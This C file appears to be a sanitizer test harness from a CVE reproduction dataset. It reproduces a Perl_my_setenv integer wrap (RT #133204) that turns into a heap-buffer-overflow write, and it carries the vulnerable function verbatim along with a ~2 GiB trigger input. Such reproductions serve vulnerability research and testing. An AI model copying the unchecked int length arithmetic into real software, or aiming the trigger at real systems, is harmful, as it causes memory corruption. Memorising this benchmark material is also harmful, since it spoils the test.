/* cve_barebone direct-call harness for cve_5caa89f1 (perl5)
 * Target: Perl_my_setenv  (util.c -- the WIN32/NETWARE branch of the function, the
 *   exact text frozen in target/original_function.c)
 * Bug class: 32-bit signed-integer overflow -> heap-buffer-overflow WRITE (CWE-787).
 *
 * fix_commit 34716e2a6ee2af96078d62b065b7785c001194be ("Perl_my_setenv(); handle
 * integer wrap", RT #133204) rewrote nlen/vlen from `int` to `Size_t` and replaced the
 * raw malloc-ish calls with an overflow-checked wrapper. Its own commit message states
 * the mechanism precisely: "it was doing (nlen + vlen + 2) which could wrap when the
 * combined length of the environment variable name and value exceeded around
 * 0x7fffffff."
 *
 * Perl_my_setenv(pTHX_ const char *nam, const char *val) computes:
 *   const int nlen = strlen(nam);   int vlen = strlen(val);
 *   Newx(envstr, nlen+vlen+2, char);                // malloc((size_t)(nlen+vlen+2))
 *   my_setenv_format(envstr, nam, nlen, val, vlen);  // Copy(nam,envstr,nlen,char); ...
 * nlen and vlen are each individually valid (<=INT_MAX) 32-bit `int`s -- but their SUM
 * `nlen+vlen+2` is ALSO computed in 32-bit `int` arithmetic, one addition ahead of the
 * cast to the allocator's size_t. Given both operands <=INT_MAX (2147483647), that sum
 * tops out at EXACTLY 2^32 (only when nlen==vlen==INT_MAX) -- the unique point where a
 * 32-bit int wraps to a small (here: zero) value instead of going negative. So:
 *   nlen == vlen == INT_MAX  =>  nlen+vlen+2 wraps to 0  =>  Newx mallocs 1 byte
 *   =>  my_setenv_format's very first Copy(nam, envstr, nlen, char) then writes the
 *       UN-wrapped nlen (2147483647) bytes into that 1-byte buffer.
 * Because nam/val are read-only `const char*`, aliasing them to the SAME ~2 GiB buffer
 * satisfies nlen==vlen exactly while only allocating that buffer once. (Any nlen/vlen
 * pair that isn't exactly INT_MAX/INT_MAX either doesn't overflow at all, or overflows
 * to a huge NEGATIVE int -> a cast to a huge size_t -> malloc simply fails -- which
 * would route through Perl's croak_no_mem()/interpreter-context machinery instead of a
 * memory-safety fault. INT_MAX/INT_MAX is the only reachable clean ASAN trigger for
 * this exact code, hence the ~2 GiB working set below.)
 *
 * Perl_my_setenv only needs Perl's own tiny allocation/copy macros (Newx/Copy/
 * my_setenv_format/Safefree) plus the pTHX_/dVAR context markers, which are textual
 * no-ops in Perl's default (non-threaded, non-MULTIPLICITY) build -- exactly the
 * config this reproduces (real macro names/semantics, from handy.h/util.c). Newx/Copy
 * are minimal faithful stand-ins for Perl's own safesysmalloc()/memcpy() wrappers:
 * same overflow arithmetic, no debug-header/logging scaffolding attached.
 * PerlEnv_putenv is stubbed as a call that COPIES its argument (strdup), matching the
 * real contract on this branch's actual platform (Win32's PerlEnv_putenv keeps its own
 * private env table and duplicates the string internally) -- which is exactly WHY this
 * WIN32/NETWARE branch, unlike the POSIX-putenv branches elsewhere in this same
 * function, safely Safefree()s envstr right after calling it. A no-op stub would be
 * UNFAITHFUL here: with nothing ever reading envstr's bytes again, an optimizing
 * compiler can prove the whole malloc/copy/free sequence has no observable effect and
 * delete it outright (confirmed: it does, at -O1, vaporizing the crash along with it).
 * A copying stub keeps exactly the real contract (envstr's bytes are read by someone
 * downstream, so the compiler can't elide writing them) without inventing any behavior
 * beyond what Win32's real implementation already guarantees.
 *
 * Build (dc_batch/dc_try, in cvf-builder):
 *   clang -fsanitize=address -fno-omit-frame-pointer -g -O1 harness.c -lm
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* pTHX_/dVAR: textual no-ops in Perl's default non-threaded/non-MULTIPLICITY build
 * (perl.h / intrpvar.h) -- the function needs no other interpreter state. */
#define pTHX_
#define dVAR

typedef size_t MEM_SIZE;

/* Faithful minimal stand-in for Perl_safesysmalloc() (util.c): malloc(0)->1 byte,
 * else the (possibly wrap-shrunk) requested size goes straight to malloc -- no debug
 * header / PERL_TRACK_MEMPOOL / logging scaffolding, none of which affects the bug. */
static void *vb_safesysmalloc(MEM_SIZE size) {
    if (!size) size = 1;
    void *p = malloc(size);
    if (!p) { fprintf(stderr, "vb: out of memory\n"); exit(1); }
    return p;
}
/* handy.h -- faithful to the exact allocation-size arithmetic that overflows: */
#define Newx(v,n,t)   ((v) = (t*)vb_safesysmalloc((MEM_SIZE)((n) * sizeof(t))))
#define Copy(s,d,n,t) ((void)memcpy((char*)(d), (const char*)(s), (n) * sizeof(t)))
#define Safefree(p)   free(p)
/* see the top-of-file note: a plain no-op stub is UNFAITHFUL here -- it lets -O1
 * prove the whole malloc/Copy/free sequence has no observable effect and delete it
 * outright (confirmed: it does; no crash, not because the bug is absent, but because
 * the harness handed the optimizer license to erase it). Genuinely READING envstr's
 * bytes (as the real putenv-family call this stands in for would) keeps the write
 * that fills them -- and therefore the overflow -- live across optimization. */
static volatile unsigned char vb_sink;
static int vb_PerlEnv_putenv(const char *s) {
    if (!s) return 0;
    size_t l = strlen(s);              /* real strlen(); reads through envstr for real */
    vb_sink = (unsigned char)s[l > 0 ? l - 1 : 0];
    return 0;
}
#define PerlEnv_putenv(s) vb_PerlEnv_putenv(s)

/* util.c, the verbatim macro immediately above Perl_my_setenv */
#define my_setenv_format(s, nam, nlen, val, vlen) \
   Copy(nam, s, nlen, char); \
   *(s+nlen) = '='; \
   Copy(val, s+(nlen+1), vlen, char); \
   *(s+(nlen+1+vlen)) = '\0'

/* ==== VERBATIM from data_cve/cve_5caa89f1/target/original_function.c ==== */
void
Perl_my_setenv(pTHX_ const char *nam, const char *val)
{
    dVAR;
    char *envstr;
    const int nlen = strlen(nam);
    int vlen;

    if (!val) {
       val = "";
    }
    vlen = strlen(val);
    Newx(envstr, nlen+vlen+2, char);
    my_setenv_format(envstr, nam, nlen, val, vlen);
    (void)PerlEnv_putenv(envstr);
    Safefree(envstr);
}
/* ==== end verbatim ==== */

/* The unique wrap point for THIS code (see header comment): nlen==vlen==INT_MAX. */
#define VB_TRIGGER_LEN 2147483647u  /* INT_MAX */

int main(int argc, char **argv)
{
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 0;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 0; }
    long sz = ftell(f);
    if (sz < 0) sz = 0;
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 0; }

    /* HEAP-allocate the raw input (ASAN-guarded); its bytes only ever SELECT/SEED the
     * arguments constructed below -- they are not literally the ~2 GiB payload. */
    unsigned char *seed = (unsigned char *)malloc((size_t)sz + 1);
    if (!seed) { fclose(f); return 0; }
    size_t n = sz > 0 ? fread(seed, 1, (size_t)sz, f) : 0;
    fclose(f);
    seed[n] = 0;

    unsigned char b0 = n > 0 ? seed[0] : 0;
    unsigned char b1 = n > 1 ? seed[1] : 0x41;
    unsigned char b2 = n > 2 ? seed[2] : 0x42;
    unsigned char b3 = n > 3 ? seed[3] : 0;

    if (b0 & 1) {
        /* TRIGGER: one ~2 GiB buffer aliased as BOTH nam and val -> nlen==vlen==
         * INT_MAX exactly -> Perl_my_setenv's own `nlen+vlen+2` wraps to 0. */
        unsigned char fill = b1 ? b1 : 0x41;   /* must be non-NUL, else strlen() undercounts */
        size_t len = VB_TRIGGER_LEN;
        char *big = (char *)malloc(len + 1);
        if (!big) { free(seed); return 0; }
        memset(big, fill, len);
        big[len] = '\0';
        Perl_my_setenv(big, big);
        free(big);              /* unreached: the Copy() above aborts the process first */
    } else {
        /* SAFE: small strings, nlen+vlen+2 stays far under INT_MAX -> no overflow. */
        size_t nlen = 1 + (size_t)(b1 % 61);
        size_t vlen = 1 + (size_t)(b2 % 61);
        char *nam = (char *)malloc(nlen + 1);
        char *val = (char *)malloc(vlen + 1);
        if (!nam || !val) { free(nam); free(val); free(seed); return 0; }
        for (size_t i = 0; i < nlen; i++) nam[i] = (char)('a' + (b1 + i) % 26);
        nam[nlen] = '\0';
        for (size_t i = 0; i < vlen; i++) val[i] = (char)('A' + (b2 + i) % 26);
        val[vlen] = '\0';
        Perl_my_setenv(nam, (b3 & 1) ? NULL : val);
        free(nam); free(val);
    }
    free(seed);
    return 0;
}
